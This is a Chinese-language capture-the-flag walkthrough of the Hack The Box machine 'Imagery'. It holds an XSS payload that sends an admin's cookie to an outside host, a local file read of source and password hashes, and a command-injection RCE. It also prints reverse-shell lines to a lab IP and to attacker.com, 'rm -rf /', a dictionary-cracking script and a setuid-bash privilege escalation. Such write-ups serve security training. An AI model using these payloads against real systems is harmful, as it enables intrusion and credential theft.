{"pageProps":{"postData":{"id":"HackTheBoxSeason9 - Imagery","contentHtml":"<h1>Season9 - Imagery</h1>\n<blockquote>\n<p><a href=\"https://app.hackthebox.com/machines/751\">https://app.hackthebox.com/machines/751</a></p>\n</blockquote>\n<p><img src=\"/post-images/HackTheBoxSeason9%20-%20Imagery/image.png\" alt=\"image.png\"></p>\n<h2>Recon</h2>\n<h3>PortScan</h3>\n<pre><code class=\"hljs language-bash\">➜  imagery nmap -sT -min-rate 10000 -p- 10.10.11.88   \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-10-03 22:17 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.10.11.88\nHost is up (0.073s latency).\nNot shown: 65532 closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n1234/tcp open  hotline\n8000/tcp open  http-alt\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 7.33 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  imagery nmap -sT -A -p 22,1234,8000 10.10.11.88\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-10-03 22:20 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.10.11.88\nHost is up (0.067s latency).\n\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 9.7p1 Ubuntu 7ubuntu4.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 35:94:fb:70:36:1a:26:3c:a8:3c:5a:5a:e4:fb:8c:18 (ECDSA)\n|_  256 c2:52:7c:42:61:ce:97:9d:12:d5:01:1c:ba:68:0f:fa (ED25519)\n1234/tcp open  http    SimpleHTTPServer 0.6 (Python 3.12.7)\n|_http-server-header: SimpleHTTP/0.6 Python/3.12.7\n|_http-title: Directory listing <span class=\"hljs-keyword\">for</span> /\n8000/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.12.7)\n|_http-server-header: Werkzeug/3.1.3 Python/3.12.7\n|_http-title: Image Gallery\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose|router\nRunning: Linux 4.X|5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT      ADDRESS\n1   67.11 ms 10.10.14.1\n2   64.72 ms 10.10.11.88\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 11.59 seconds\n</code></pre>\n<h3>枚举</h3>\n<p>随意注册一个用户进行登录</p>\n<p><img src=\"/post-images/HackTheBoxSeason9%20-%20Imagery/image1.png\" alt=\"image.png\"></p>\n<p>登录进来后，看数据包，有我们登录的用户的数据</p>\n<p><img src=\"/post-images/HackTheBoxSeason9%20-%20Imagery/image2.png\" alt=\"image.png\"></p>\n<p>一开始以为是 <code>jwt</code>，但是貌似并不是</p>\n<pre><code class=\"hljs language-bash\">Cookie: session=.eJyrVkrJLC7ISaz0TFGyUrIwNjFJNk4zUdJRyix2TMnNzFOySkvMKU4F8eMzcwtSi4rz8xJLMvPS40tSi0tKi1OLkFXAxOITk5PzS_NK4HIgwbzE3FSgHYYOhXrJ-blKtQBa_iuB.aN_W1Q.P8aflniN6fcK97nVc568grDIlT0\n</code></pre>\n<p>目录扫描，超级慢，直接不扫了</p>\n<pre><code class=\"hljs language-bash\">➜  imagery gobuster <span class=\"hljs-built_in\">dir</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,zip -u http://10.10.11.88:8000\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) &#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://10.10.11.88:8000\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,zip\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster <span class=\"hljs-keyword\">in</span> directory enumeration mode\n===============================================================\n/images               (Status: 401) [Size: 59]\n/login                (Status: 405) [Size: 153]\n/register             (Status: 405) [Size: 153]\n/logout               (Status: 405) [Size: 153]\n</code></pre>\n<p>随意上传了一张图片，但是很多功能都无法使用，所以我们应该先要获取管理员权限</p>\n<p><img src=\"/post-images/HackTheBoxSeason9%20-%20Imagery/image3.png\" alt=\"image.png\"></p>\n<p>因为是 python 服务器，大概率也不是打图片马，还有一个 <code>Report Bug</code> 功能</p>\n<p><img src=\"/post-images/HackTheBoxSeason9%20-%20Imagery/image4.png\" alt=\"image.png\"></p>\n<p><img src=\"/post-images/HackTheBoxSeason9%20-%20Imagery/image5.png\" alt=\"image.png\"></p>\n<p>随便提交一些东西，提示：<strong><code>Bug report submitted. Admin review in progress.</code></strong> 表示管理员会对其进行审核，也就是使用着管理员的身份</p>\n<p><img src=\"/post-images/HackTheBoxSeason9%20-%20Imagery/image6.png\" alt=\"image.png\"></p>\n<p>不过首先还是测试一下是否存在 SQL 注入，手动和使用工具进行扫描一遍都没有扫描出来</p>\n<pre><code class=\"hljs language-bash\">➜  imagery sqlmap -r packet --level 3 --risk 3 --batch\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxSeason9%20-%20Imagery/image7.png\" alt=\"image.png\"></p>\n<h3>XSS</h3>\n<p>根据上边的提示：<strong><code>Bug report submitted. Admin review in progress.</code></strong> 表示管理员会对其进行审核，也就是使用着管理员的身份</p>\n<p>也就是我们提交 URL 或者 XSS 代码可能会触发到</p>\n<p>首先输入一遍 URL，等待是否触发</p>\n<p><img src=\"/post-images/HackTheBoxSeason9%20-%20Imagery/image8.png\" alt=\"image.png\"></p>\n<p>并没有触发，尝试一下 XSS</p>\n<p>经过测试后可以通过如下代码进行触发</p>\n<pre><code class=\"hljs language-bash\">&#x3C;img src=<span class=\"hljs-string\">\"http://10.10.14.113:8080/log?cookie=\"</span> + document.cookie>\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxSeason9%20-%20Imagery/image9.png\" alt=\"image.png\"></p>\n<p>尝试获取一下 <code>cookie</code></p>\n<p><img src=\"/post-images/HackTheBoxSeason9%20-%20Imagery/image10.png\" alt=\"image.png\"></p>\n<p>最后通过如下代码可以触发得到 <code>cookie</code></p>\n<pre><code class=\"hljs language-bash\">&#x3C;img src=x onerror=<span class=\"hljs-string\">\"this.src='http://10.10.14.113:8080/?'+document.cookie\"</span>>\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxSeason9%20-%20Imagery/image11.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aN_lNA.JEUfB42pOi4xOGy9nt13xU-uCIY\n.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aOCUgw.7hoJx49e3QwScLnI0UYOoRH_x5Q\n</code></pre>\n<p>替换原本 <code>cookie</code> 后就能进入管理员面板（进入面板后疯狂跳其他 URL）</p>\n<p><img src=\"/post-images/HackTheBoxSeason9%20-%20Imagery/image12.png\" alt=\"image.png\"></p>\n<h3>LFI 利用</h3>\n<p>后台貌似就多了一个功能 “<code>Download Log</code>”</p>\n<p>抓包后进行测试，存在 LFI</p>\n<p><img src=\"/post-images/HackTheBoxSeason9%20-%20Imagery/image13.png\" alt=\"image.png\"></p>\n<p>有两个有 shell 的用户，<code>mark</code> 和 <code>web</code></p>\n<p>枚举目录，<code>/var</code> 里面没测出来，尝试 <code>web</code> 用户家目录</p>\n<p><img src=\"/post-images/HackTheBoxSeason9%20-%20Imagery/image14.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">// app.py\nfrom flask import Flask, render_template\nimport os\nimport sys\nfrom datetime import datetime\nfrom config import *\nfrom utils import _load_data, _save_data\nfrom utils import *\nfrom api_auth import bp_auth\nfrom api_upload import bp_upload\nfrom api_manage import bp_manage\nfrom api_edit import bp_edit\nfrom api_admin import bp_admin\nfrom api_misc import bp_misc\n\napp_core = Flask(__name__)\napp_core.secret_key = os.urandom(24).hex()\napp_core.config[<span class=\"hljs-string\">'SESSION_COOKIE_HTTPONLY'</span>] = False\n\napp_core.register_blueprint(bp_auth)\napp_core.register_blueprint(bp_upload)\napp_core.register_blueprint(bp_manage)\napp_core.register_blueprint(bp_edit)\napp_core.register_blueprint(bp_admin)\napp_core.register_blueprint(bp_misc)\n\n@app_core.route(<span class=\"hljs-string\">'/'</span>)\ndef main_dashboard():\n    <span class=\"hljs-built_in\">return</span> render_template(<span class=\"hljs-string\">'index.html'</span>)\n\n<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">'__main__'</span>:\n    current_database_data = _load_data()\n    default_collections = [<span class=\"hljs-string\">'My Images'</span>, <span class=\"hljs-string\">'Unsorted'</span>, <span class=\"hljs-string\">'Converted'</span>, <span class=\"hljs-string\">'Transformed'</span>]\n    existing_collection_names_in_database = {g[<span class=\"hljs-string\">'name'</span>] <span class=\"hljs-keyword\">for</span> g <span class=\"hljs-keyword\">in</span> current_database_data.get(<span class=\"hljs-string\">'image_collections'</span>, [])}\n    <span class=\"hljs-keyword\">for</span> collection_to_add <span class=\"hljs-keyword\">in</span> default_collections:\n        <span class=\"hljs-keyword\">if</span> collection_to_add not <span class=\"hljs-keyword\">in</span> existing_collection_names_in_database:\n            current_database_data.setdefault(<span class=\"hljs-string\">'image_collections'</span>, []).append({<span class=\"hljs-string\">'name'</span>: collection_to_add})\n    _save_data(current_database_data)\n    <span class=\"hljs-keyword\">for</span> user_entry <span class=\"hljs-keyword\">in</span> current_database_data.get(<span class=\"hljs-string\">'users'</span>, []):\n        user_log_file_path = os.path.join(SYSTEM_LOG_FOLDER, f<span class=\"hljs-string\">\"{user_entry['username']}.log\"</span>)\n        <span class=\"hljs-keyword\">if</span> not os.path.exists(user_log_file_path):\n            with open(user_log_file_path, <span class=\"hljs-string\">'w'</span>) as f:\n                f.write(f<span class=\"hljs-string\">\"[{datetime.now().isoformat()}] Log file created for {user_entry['username']}.\\n\"</span>)\n    port = int(os.environ.get(<span class=\"hljs-string\">\"PORT\"</span>, 8000))\n    <span class=\"hljs-keyword\">if</span> port <span class=\"hljs-keyword\">in</span> BLOCKED_APP_PORTS:\n        <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"Port {port} is blocked for security reasons. Please choose another port.\"</span>)\n        sys.exit(1)\n    app_core.run(debug=False, host=<span class=\"hljs-string\">'0.0.0.0'</span>, port=port)\n</code></pre>\n<p>包含配置文件 <code>config.py</code> ，还能得到一个新文件名 <code>db.json</code></p>\n<p><img src=\"/post-images/HackTheBoxSeason9%20-%20Imagery/image15.png\" alt=\"image.png\"></p>\n<p>里面是用户的凭据</p>\n<pre><code class=\"hljs language-bash\">\t\t\t\t{\n            <span class=\"hljs-string\">\"username\"</span>: <span class=\"hljs-string\">\"admin@imagery.htb\"</span>,\n            <span class=\"hljs-string\">\"password\"</span>: <span class=\"hljs-string\">\"5d9c1d507a3f76af1e5c97a3ad1eaa31\"</span>,\n            <span class=\"hljs-string\">\"isAdmin\"</span>: <span class=\"hljs-literal\">true</span>,\n            <span class=\"hljs-string\">\"displayId\"</span>: <span class=\"hljs-string\">\"a1b2c3d4\"</span>,\n            <span class=\"hljs-string\">\"login_attempts\"</span>: 0,\n            <span class=\"hljs-string\">\"isTestuser\"</span>: <span class=\"hljs-literal\">false</span>,\n            <span class=\"hljs-string\">\"failed_login_attempts\"</span>: 0,\n            <span class=\"hljs-string\">\"locked_until\"</span>: null\n        },\n        {\n            <span class=\"hljs-string\">\"username\"</span>: <span class=\"hljs-string\">\"testuser@imagery.htb\"</span>,\n            <span class=\"hljs-string\">\"password\"</span>: <span class=\"hljs-string\">\"2c65c8d7bfbca32a3ed42596192384f6\"</span>,\n            <span class=\"hljs-string\">\"isAdmin\"</span>: <span class=\"hljs-literal\">false</span>,\n            <span class=\"hljs-string\">\"displayId\"</span>: <span class=\"hljs-string\">\"e5f6g7h8\"</span>,\n            <span class=\"hljs-string\">\"login_attempts\"</span>: 0,\n            <span class=\"hljs-string\">\"isTestuser\"</span>: <span class=\"hljs-literal\">true</span>,\n            <span class=\"hljs-string\">\"failed_login_attempts\"</span>: 2,\n            <span class=\"hljs-string\">\"locked_until\"</span>: null\n        },\n        {\n            <span class=\"hljs-string\">\"username\"</span>: <span class=\"hljs-string\">\"test@test.com\"</span>,\n            <span class=\"hljs-string\">\"password\"</span>: <span class=\"hljs-string\">\"098f6bcd4621d373cade4e832627b4f6\"</span>,\n            <span class=\"hljs-string\">\"displayId\"</span>: <span class=\"hljs-string\">\"5241c653\"</span>,\n            <span class=\"hljs-string\">\"isAdmin\"</span>: <span class=\"hljs-literal\">false</span>,\n            <span class=\"hljs-string\">\"failed_login_attempts\"</span>: 0,\n            <span class=\"hljs-string\">\"locked_until\"</span>: null,\n            <span class=\"hljs-string\">\"isTestuser\"</span>: <span class=\"hljs-literal\">false</span>\n        },\n</code></pre>\n<p>其中 <code>testuser</code> 的密码可以解出来 <code>iambatman</code></p>\n<p><img src=\"/post-images/HackTheBoxSeason9%20-%20Imagery/image16.png\" alt=\"image.png\"></p>\n<p>再审计一下其他文件，从 <code>app.py</code> 中可以得到好几个文件</p>\n<pre><code class=\"hljs language-bash\">from api_auth import bp_auth\nfrom api_upload import bp_upload\nfrom api_manage import bp_manage\nfrom api_edit import bp_edit\nfrom api_admin import bp_admin\nfrom api_misc import bp_misc\n</code></pre>\n<p>读取并通过 AI 进行审计，最后在 <code>api_edit.py</code> 审计到存在 <code>RCE</code> 漏洞</p>\n<p>远程代码执行 (RCE) 漏洞 (Command Injection)</p>\n<ul>\n<li>\n<p><strong>问题点</strong>: <code>/apply_visual_transform</code> 端点中的 <code>crop</code> 操作。</p>\n<pre><code class=\"hljs language-python\">&#x3C;PYTHON>\n<span class=\"hljs-keyword\">if</span> transform_type == <span class=\"hljs-string\">'crop'</span>:\n    x = <span class=\"hljs-built_in\">str</span>(params.get(<span class=\"hljs-string\">'x'</span>))\n    y = <span class=\"hljs-built_in\">str</span>(params.get(<span class=\"hljs-string\">'y'</span>))\n    width = <span class=\"hljs-built_in\">str</span>(params.get(<span class=\"hljs-string\">'width'</span>))\n    height = <span class=\"hljs-built_in\">str</span>(params.get(<span class=\"hljs-string\">'height'</span>))\n<span class=\"hljs-comment\"># VULNERABLE LINE: f-string formatting with shell=True</span>\n    command = <span class=\"hljs-string\">f\"<span class=\"hljs-subst\">{IMAGEMAGICK_CONVERT_PATH}</span> <span class=\"hljs-subst\">{original_filepath}</span> -crop <span class=\"hljs-subst\">{width}</span>x<span class=\"hljs-subst\">{height}</span>+<span class=\"hljs-subst\">{x}</span>+<span class=\"hljs-subst\">{y}</span> <span class=\"hljs-subst\">{output_filepath}</span>\"</span>\n    subprocess.run(command, capture_output=<span class=\"hljs-literal\">True</span>, text=<span class=\"hljs-literal\">True</span>, shell=<span class=\"hljs-literal\">True</span>, check=<span class=\"hljs-literal\">True</span>)\n</code></pre>\n</li>\n<li>\n<p><strong>描述</strong>: 这段代码存在一个教科书式的命令注入漏洞。</p>\n<ol>\n<li>它使用 f-string 将用户直接提供的参数（<code>width</code>, <code>height</code>, <code>x</code>, <code>y</code>）拼接到一个命令字符串中。</li>\n<li>最致命的是，它使用了 <code>subprocess.run</code> 的 <code>shell=True</code> 参数。这会使操作系统 shell（如bash）来解释整个命令字符串。</li>\n</ol>\n</li>\n<li>\n<p><strong>攻击场景</strong>: 攻击者可以构造一个恶意的 JSON payload，将 shell 命令注入到参数中。例如：</p>\n<pre><code class=\"hljs language-python\">&#x3C;JSON>\n{\n  <span class=\"hljs-string\">\"imageId\"</span>: <span class=\"hljs-string\">\"some-valid-id\"</span>,\n  <span class=\"hljs-string\">\"transformType\"</span>: <span class=\"hljs-string\">\"crop\"</span>,\n  <span class=\"hljs-string\">\"params\"</span>: {\n    <span class=\"hljs-string\">\"width\"</span>: <span class=\"hljs-string\">\"100; id\"</span>,// Injects the <span class=\"hljs-string\">'id'</span> command\n    <span class=\"hljs-string\">\"height\"</span>: <span class=\"hljs-string\">\"100\"</span>,\n    <span class=\"hljs-string\">\"x\"</span>: <span class=\"hljs-string\">\"10\"</span>,\n    <span class=\"hljs-string\">\"y\"</span>: <span class=\"hljs-string\">\"10\"</span>\n  }\n}\n</code></pre>\n<p>服务器将执行的命令会变成：\n<code>convert &#x3C;input> -crop 100; id x100+10+10 &#x3C;output></code>\nShell 会依次执行：</p>\n<ol>\n<li><code>convert &#x3C;input> -crop 100</code> (可能会失败)</li>\n<li><code>id</code> (成功执行，返回服务器用户信息)</li>\n<li><code>x100+10+10 &#x3C;output></code> (可能会失败) 攻击者可以注入任何命令，如 <code>rm -rf /</code> 来删除整个文件系统，或者 <code>bash -c 'bash -i >&#x26; /dev/tcp/attacker.com/4444 0>&#x26;1'</code> 来获取一个反向 shell，从而完全控制服务器。</li>\n</ol>\n</li>\n</ul>\n<h3>RCE</h3>\n<p>对上面的审计的结果进行测试</p>\n<p>通过上面的到的用户进行登录</p>\n<p><img src=\"/post-images/HackTheBoxSeason9%20-%20Imagery/image17.png\" alt=\"image.png\"></p>\n<p>执行成功</p>\n<p><img src=\"/post-images/HackTheBoxSeason9%20-%20Imagery/image18.png\" alt=\"image.png\"></p>\n<p>进行反弹 <code>shell</code></p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-string\">\"x\"</span>:<span class=\"hljs-string\">\"100; /bin/bash -c 'bash -i >&#x26; /dev/tcp/10.10.14.113/1234 0>&#x26;1';\"</span>\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxSeason9%20-%20Imagery/image19.png\" alt=\"image.png\"></p>\n<h2>权限提升</h2>\n<h3>zip.zes 解密</h3>\n<p>在  <code>/backup</code> 中找到一个压缩包，后缀是 <code>zip.zes</code></p>\n<pre><code class=\"hljs language-python\">bash-<span class=\"hljs-number\">5.2</span>$ ls\nweb_20250806_120723.<span class=\"hljs-built_in\">zip</span>.aes\n</code></pre>\n<ol>\n<li><strong><code>.zip</code></strong>: 文件的原始形态是一个 ZIP 压缩包。</li>\n<li><strong><code>.aes</code></strong>: 这个 ZIP 包被使用了 <strong>AES (Advanced Encryption Standard)</strong> 算法进行了加密。</li>\n</ol>\n<p>写一个脚本进行爆破，脚本调用 <code>aescrypt</code> ：<a href=\"https://www.aescrypt.com/download/\">https://www.aescrypt.com/download/</a></p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\">#!/usr/bin/env python3</span>\n<span class=\"hljs-keyword\">import</span> subprocess\n<span class=\"hljs-keyword\">import</span> argparse\n<span class=\"hljs-keyword\">import</span> os\n<span class=\"hljs-keyword\">import</span> sys\n<span class=\"hljs-keyword\">import</span> shutil\n\n<span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">check_dependencies</span>():\n    <span class=\"hljs-string\">\"\"\"检查 aescrypt 是否已安装并处于系统 PATH 中\"\"\"</span>\n    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-keyword\">not</span> shutil.which(<span class=\"hljs-string\">\"aescrypt\"</span>):\n        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"[!] 错误: 'aescrypt' 命令未找到。\"</span>, file=sys.stderr)\n        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"    请先安装 aescrypt 并确保它在您的系统 PATH 中。\"</span>, file=sys.stderr)\n        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"    在 Debian/Ubuntu 上，可以运行: sudo apt-get install aescrypt\"</span>, file=sys.stderr)\n        sys.exit(<span class=\"hljs-number\">1</span>)\n\n<span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">crack_aes_file</span>(<span class=\"hljs-params\">aes_file, dictionary_file</span>):\n    <span class=\"hljs-string\">\"\"\"\n    使用字典攻击来解密 AES 文件。\n\n    :param aes_file: AES 加密文件的路径。\n    :param dictionary_file: 密码字典文件的路径。\n    \"\"\"</span>\n    <span class=\"hljs-comment\"># 检查输入文件是否存在</span>\n    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-keyword\">not</span> os.path.exists(aes_file):\n        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">f\"[!] 错误: 加密文件 '<span class=\"hljs-subst\">{aes_file}</span>' 不存在。\"</span>, file=sys.stderr)\n        sys.exit(<span class=\"hljs-number\">1</span>)\n        \n    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-keyword\">not</span> os.path.exists(dictionary_file):\n        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">f\"[!] 错误: 字典文件 '<span class=\"hljs-subst\">{dictionary_file}</span>' 不存在。\"</span>, file=sys.stderr)\n        sys.exit(<span class=\"hljs-number\">1</span>)\n\n    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">f\"[*] 开始破解文件: <span class=\"hljs-subst\">{aes_file}</span>\"</span>)\n    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">f\"[*] 使用字典: <span class=\"hljs-subst\">{dictionary_file}</span>\"</span>)\n    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"-\"</span> * <span class=\"hljs-number\">30</span>)\n\n    <span class=\"hljs-comment\"># 打开字典文件</span>\n    <span class=\"hljs-keyword\">try</span>:\n        <span class=\"hljs-keyword\">with</span> <span class=\"hljs-built_in\">open</span>(dictionary_file, <span class=\"hljs-string\">'r'</span>, encoding=<span class=\"hljs-string\">'utf-8'</span>, errors=<span class=\"hljs-string\">'ignore'</span>) <span class=\"hljs-keyword\">as</span> f:\n            <span class=\"hljs-keyword\">for</span> line <span class=\"hljs-keyword\">in</span> f:\n                <span class=\"hljs-comment\"># 去除密码前后的空白字符，特别是换行符</span>\n                password = line.strip()\n                \n                <span class=\"hljs-comment\"># 跳过空行</span>\n                <span class=\"hljs-keyword\">if</span> <span class=\"hljs-keyword\">not</span> password:\n                    <span class=\"hljs-keyword\">continue</span>\n\n                <span class=\"hljs-comment\"># 打印当前尝试的密码，使用 '\\r' 实现单行刷新效果</span>\n                <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">f\"[*] 正在尝试密码: <span class=\"hljs-subst\">{password.ljust(<span class=\"hljs-number\">30</span>)}</span>\"</span>, end=<span class=\"hljs-string\">'\\r'</span>)\n\n                <span class=\"hljs-comment\"># 构建 aescrypt 命令</span>\n                command = [<span class=\"hljs-string\">'aescrypt'</span>, <span class=\"hljs-string\">'-d'</span>, <span class=\"hljs-string\">'-p'</span>, password, aes_file]\n                \n                <span class=\"hljs-comment\"># 执行命令并捕获输出</span>\n                <span class=\"hljs-comment\"># capture_output=True 會捕獲 stdout 和 stderr</span>\n                <span class=\"hljs-comment\"># text=True 会将输出解码为字符串</span>\n                result = subprocess.run(command, capture_output=<span class=\"hljs-literal\">True</span>, text=<span class=\"hljs-literal\">True</span>)\n\n                <span class=\"hljs-comment\"># 检查标准错误输出</span>\n                <span class=\"hljs-comment\"># aescrypt 在密码错误时会将错误信息输出到 stderr</span>\n                error_message = <span class=\"hljs-string\">\"Message has been altered or password is incorrect\"</span>\n                \n                <span class=\"hljs-keyword\">if</span> error_message <span class=\"hljs-keyword\">not</span> <span class=\"hljs-keyword\">in</span> result.stderr:\n                    <span class=\"hljs-comment\"># 如果错误信息不在输出中，说明密码可能正确</span>\n                    <span class=\"hljs-comment\"># 清除'正在尝试'那一行</span>\n                    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\" \"</span> * <span class=\"hljs-number\">60</span>, end=<span class=\"hljs-string\">'\\r'</span>) \n                    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">f\"\\n[+] 成功! 找到密码: <span class=\"hljs-subst\">{password}</span>\"</span>)\n                    decrypted_file = aes_file.rsplit(<span class=\"hljs-string\">'.aes'</span>, <span class=\"hljs-number\">1</span>)[<span class=\"hljs-number\">0</span>]\n                    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">f\"[*] 文件已解密为: <span class=\"hljs-subst\">{decrypted_file}</span>\"</span>)\n                    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-comment\"># 找到密码后，退出函数</span>\n\n    <span class=\"hljs-keyword\">except</span> FileNotFoundError:\n        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">f\"[!] 错误: 字典文件 '<span class=\"hljs-subst\">{dictionary_file}</span>' 未找到。\"</span>, file=sys.stderr)\n        sys.exit(<span class=\"hljs-number\">1</span>)\n    <span class=\"hljs-keyword\">except</span> Exception <span class=\"hljs-keyword\">as</span> e:\n        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">f\"\\n[!] 发生未知错误: <span class=\"hljs-subst\">{e}</span>\"</span>, file=sys.stderr)\n        sys.exit(<span class=\"hljs-number\">1</span>)\n\n    <span class=\"hljs-comment\"># 如果循环结束仍未找到密码</span>\n    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"\\n[-] 破解失败: 字典中未找到正确的密码。\"</span>)\n\n<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">\"__main__\"</span>:\n    <span class=\"hljs-comment\"># 设置命令行参数解析器</span>\n    parser = argparse.ArgumentParser(\n        description=<span class=\"hljs-string\">\"使用字典攻击破解 aescrypt 加密的 AES 文件。\"</span>,\n        formatter_class=argparse.RawTextHelpFormatter <span class=\"hljs-comment\"># 保持帮助信息格式</span>\n    )\n    parser.add_argument(<span class=\"hljs-string\">\"aes_file\"</span>, <span class=\"hljs-built_in\">help</span>=<span class=\"hljs-string\">\"要解密的 .aes 文件路径。\"</span>)\n    parser.add_argument(<span class=\"hljs-string\">\"dictionary_file\"</span>, <span class=\"hljs-built_in\">help</span>=<span class=\"hljs-string\">\"包含密码列表的字典文件路径。\"</span>)\n\n    args = parser.parse_args()\n\n    <span class=\"hljs-comment\"># 运行前检查依赖</span>\n    check_dependencies()\n    \n    <span class=\"hljs-comment\"># 开始破解</span>\n    crack_aes_file(args.aes_file, args.dictionary_file)\n</code></pre>\n<p>指定字典 <code>rockyou.txt</code></p>\n<p><img src=\"/post-images/HackTheBoxSeason9%20-%20Imagery/image20.png\" alt=\"image.png\"></p>\n<p>解压出来后是 <code>web</code> 端源代码，但是 <code>db.json</code> 有 mark 的凭据</p>\n<pre><code class=\"hljs language-python\">       {\n            <span class=\"hljs-string\">\"username\"</span>: <span class=\"hljs-string\">\"mark@imagery.htb\"</span>,\n            <span class=\"hljs-string\">\"password\"</span>: <span class=\"hljs-string\">\"01c3d2e5bdaf6134cec0a367cf53e535\"</span>,\n            <span class=\"hljs-string\">\"displayId\"</span>: <span class=\"hljs-string\">\"868facaf\"</span>,\n            <span class=\"hljs-string\">\"isAdmin\"</span>: false,\n            <span class=\"hljs-string\">\"failed_login_attempts\"</span>: <span class=\"hljs-number\">0</span>,\n            <span class=\"hljs-string\">\"locked_until\"</span>: null,\n            <span class=\"hljs-string\">\"isTestuser\"</span>: false\n        },\n</code></pre>\n<p>解密得到密码 <code>supersmash</code></p>\n<p><img src=\"/post-images/HackTheBoxSeason9%20-%20Imagery/image21.png\" alt=\"image.png\"></p>\n<p>尝试登录到 <code>mark</code> 尝试了通过 SSH 登录会提示需要进行公钥认证，懒得写公钥了直接打</p>\n<p><img src=\"/post-images/HackTheBoxSeason9%20-%20Imagery/image22.png\" alt=\"image.png\"></p>\n<p>读取 <code>user.txt</code></p>\n<pre><code class=\"hljs language-python\">bash-<span class=\"hljs-number\">5.2</span>$ cat user.txt \nc8cxxxxxxxxxxxxxxxxxxxxxxxxxaa5e\n</code></pre>\n<h3>sudo 提权</h3>\n<p>查看 sudo 权限</p>\n<pre><code class=\"hljs language-python\">bash-<span class=\"hljs-number\">5.2</span>$ sudo -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> mark on Imagery:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/<span class=\"hljs-built_in\">bin</span>\\:/usr/sbin\\:/usr/<span class=\"hljs-built_in\">bin</span>\\:/sbin\\:/<span class=\"hljs-built_in\">bin</span>\\:/snap/<span class=\"hljs-built_in\">bin</span>,\n    use_pty\n\nUser mark may run the following commands on Imagery:\n    (ALL) NOPASSWD: /usr/local/<span class=\"hljs-built_in\">bin</span>/charcol\n</code></pre>\n<p>查看帮助</p>\n<p><img src=\"/post-images/HackTheBoxSeason9%20-%20Imagery/image23.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-python\">auto add --schedule <span class=\"hljs-string\">\"* * * * *\"</span> --command <span class=\"hljs-string\">\"chmod +s /bin/bash\"</span> --name <span class=\"hljs-string\">\"sunset\"</span>\n</code></pre>\n<p>等待执行即可</p>\n<p><img 